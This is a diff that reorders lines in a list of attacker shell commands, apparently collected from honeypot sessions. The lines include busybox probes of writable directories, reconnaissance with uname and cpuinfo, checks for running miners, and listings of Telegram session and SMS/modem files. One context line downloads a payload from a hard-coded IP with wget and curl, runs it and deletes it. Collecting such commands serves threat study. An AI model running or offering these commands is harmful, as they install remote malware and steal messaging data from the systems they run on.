@@ -35,8 +35,8 @@ echo xsec
 id
 &k`g&k|zpkfq)ES[M
 g & k | zpkfq
-/bin/./uname -s -v -n -r -m
 uname -a
+/bin/./uname -s -v -n -r -m
 exit
 ping; sh
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
@@ -59,23 +59,23 @@ echo SHELL_TEST
 uname -s -m
 Accept-Encoding: gzip
 ./upnpsetup
+/ip cloud print
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x56\x45\x4d\x43\x48\x4f'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x59\x49\x48\x4a\x59\x43'
-chmod 777 ./upnpsetup
-hostname
-rm ./upnpsetup
-sudo ./upnpsetup
-uname -m&&pkill upnpsetup
-/ip cloud print
->/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x43\x41\x47\x52\x4a'
-PING
 cat /proc/cpuinfo
+chmod 777 ./upnpsetup
 echo Hi | cat -n
+hostname
 ifconfig
 locate D877F783D5D3EF8Cs
 ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
 ps -ef | grep '[Mm]iner'
 ps | grep '[Mm]iner'
+rm ./upnpsetup
+sudo ./upnpsetup
+uname -m&&pkill upnpsetup
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x43\x41\x47\x52\x4a'
+PING
 /bin/busybox TEST
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x5a\x4b\x53\x44\x48\x51'
 sudo pkill upnpsetup
